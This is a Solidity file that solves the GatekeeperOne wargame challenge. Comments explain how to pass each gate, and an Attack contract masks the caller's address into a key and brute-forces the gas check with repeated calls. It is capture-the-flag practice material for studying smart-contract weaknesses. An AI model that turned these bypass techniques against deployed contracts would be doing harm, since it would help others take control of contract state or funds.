// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts@v3.4.2/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

    //exploit by call by contract
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
    //exploit by brute force call target function
    // {x + 8191*k}
    //k => constant
    //x => brute force value
  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }
  //B0 B1 B2 B3 B4 B5 B6 B7 
  modifier gateThree(bytes8 _gateKey) {
      //B4 B5 B6 B7 == B6 B7
      //00 00 B6 B7 == B6 B7
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      //B4 B5 B6 B7 != B0 B1 B2 B3 B4 B5 B6 B7
      //00 00 B6 B7 != B0 B1 B2 B3 00 00 B6 B7
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      //B4 B5 B6 B7 == B6 B7
      //00 00 B6 B7 == B6 B7(player last 2 Byte)
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack{
    GatekeeperOne keeper;
    constructor(GatekeeperOne _keeper)public {
        keeper= _keeper;
    }

    function attack()public {
        bytes8 key = bytes8(uint64(msg.sender))& 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(keeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
        
    }
   

}